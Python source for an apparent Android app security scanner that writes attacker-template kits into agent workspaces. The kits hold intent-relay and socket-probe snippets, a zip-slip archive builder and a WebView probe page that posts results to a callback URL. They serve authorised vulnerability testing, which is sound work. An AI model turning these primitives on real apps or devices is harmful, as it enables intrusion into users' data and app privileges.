from __future__ import annotations

import json
from pathlib import Path
from typing import Any

ATTACKER_TEMPLATE_SCHEMA_VERSION = "1.0"


def attacker_template_catalog() -> list[dict[str, Any]]:
    """Return reusable ordinary-app attacker primitives available to every Agent."""

    return [
        {
            "id": "intent-relay",
            "purpose": "explicit/implicit component launch, nested Intent, ClipData and URI grants",
            "attacker_identity": "separate ordinary application UID",
            "inputs": ["component", "action", "data_uri", "extras", "nested_intent"],
            "observations": ["activity_result", "target_log", "target_file", "ui_text"],
        },
        {
            "id": "content-provider-client",
            "purpose": "query/insert/update/delete/openFile against an exposed provider",
            "attacker_identity": "separate ordinary application UID",
            "inputs": ["content_uri", "operation", "selection", "values", "mode"],
            "observations": ["provider_rows", "returned_bytes", "exception"],
        },
        {
            "id": "pending-intent-receiver",
            "purpose": "receive, mutate and send escaped PendingIntent capabilities",
            "attacker_identity": "separate ordinary application UID",
            "inputs": ["pending_intent_extra", "fill_in_intent", "flags"],
            "observations": ["activity_result", "target_log", "target_file"],
        },
        {
            "id": "localhost-client",
            "purpose": "connect to app-owned localhost TCP endpoints from another UID",
            "attacker_identity": "separate ordinary application UID",
            "inputs": ["host", "port", "request_bytes_base64"],
            "observations": ["reply_bytes", "connect_error", "target_side_effect"],
        },
        {
            "id": "unix-socket-client",
            "purpose": "connect to filesystem/abstract Unix sockets and record SELinux outcome",
            "attacker_identity": "separate ordinary application UID",
            "inputs": ["namespace", "socket_name", "request_bytes_base64"],
            "observations": ["reply_bytes", "errno", "avc_denial", "peer_credentials"],
        },
        {
            "id": "webview-callback-page",
            "purpose": "exercise WebView navigation/JSB and send semantic results to a callback sink",
            "attacker_identity": "remote web origin controlled by the tester",
            "inputs": ["bridge_name", "javascript", "callback_url", "canary"],
            "observations": ["callback_request", "returned_value", "cookie_or_token", "navigation"],
        },
        {
            "id": "archive-import",
            "purpose": "construct zip-slip/symlink/duplicate-name/encoding import payloads",
            "attacker_identity": "separate ordinary application UID or ACTION_SEND source",
            "inputs": ["entries", "delivery_intent", "mime_type"],
            "observations": ["target_file_sha256", "unauthorized_state_change", "ui_text"],
        },
    ]


def materialize_attacker_templates(root: Path) -> Path:
    """Materialize a compact, editable template kit in an Agent workspace."""

    target = root / "attacker-templates"
    target.mkdir(parents=True, exist_ok=True)
    catalog = attacker_template_catalog()
    (target / "catalog.json").write_text(
        json.dumps(
            {
                "schema_version": ATTACKER_TEMPLATE_SCHEMA_VERSION,
                "templates": catalog,
            },
            ensure_ascii=False,
            indent=2,
        ),
        encoding="utf-8",
    )
    (target / "README.md").write_text(
        """# APKScanner attacker templates

These are building blocks, not proof by themselves. Copy the relevant primitive into
`poc/`, adapt it to the target, build it through the platform PoC flow, and replay it
as a separate ordinary Android application UID. Record a target-side or remote
observation whenever possible.

The local development profile permits scoped dynamic findings on old devices. A
formal release verdict still requires an Android 16/API 36+ device.
""",
        encoding="utf-8",
    )
    (target / "webview-callback-page.html").write_text(
        """<!doctype html><meta charset=utf-8><title>APKScanner WebView probe</title>
<script>
const q = new URLSearchParams(location.search);
const callback = q.get('callback');
const canary = q.get('canary') || crypto.randomUUID();
async function report(kind, value) {
  if (!callback) return;
  await fetch(callback, {method: 'POST', headers: {'content-type':'application/json'},
    body: JSON.stringify({kind, value, canary, href: location.href})});
}
addEventListener('error', e => report('javascript_error', String(e.message)));
report('page_loaded', {title: document.title, canary});
</script>
""",
        encoding="utf-8",
    )
    (target / "archive-payload.py").write_text(
        """#!/usr/bin/env python3
import argparse, zipfile
p = argparse.ArgumentParser()
p.add_argument('output')
p.add_argument('--entry', action='append', required=True,
               help='archive/path=literal-content; repeatable')
a = p.parse_args()
with zipfile.ZipFile(a.output, 'w') as z:
    for value in a.entry:
        name, content = value.split('=', 1)
        z.writestr(name, content)
""",
        encoding="utf-8",
    )
    (target / "SocketProbe.java.txt").write_text(
        """// Copy into an ordinary-app PoC and call from a background thread.
// TCP: new java.net.Socket("127.0.0.1", port), then write/read raw bytes.
// Abstract Unix socket:
android.net.LocalSocket socket = new android.net.LocalSocket();
socket.connect(new android.net.LocalSocketAddress(
    socketName, android.net.LocalSocketAddress.Namespace.ABSTRACT));
socket.getOutputStream().write(requestBytes);
socket.getOutputStream().flush();
byte[] reply = new byte[8192];
int count = socket.getInputStream().read(reply);
// Persist count/reply or the exact errno/exception as a runtime observation.
// Also collect a narrow logcat AVC query to distinguish SELinux denial from no listener.
""",
        encoding="utf-8",
    )
    (target / "IntentRelay.java.txt").write_text(
        """// Copy into an ordinary-app PoC. Keep every attacker-controlled value explicit.
Intent outer = new Intent();
outer.setComponent(new ComponentName(targetPackage, targetComponent));
Intent nested = new Intent(attackerControlledAction);
outer.putExtra(Intent.EXTRA_INTENT, nested);
outer.setClipData(ClipData.newRawUri("probe", attackerControlledUri));
outer.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
startActivity(outer);
""",
        encoding="utf-8",
    )
    return target
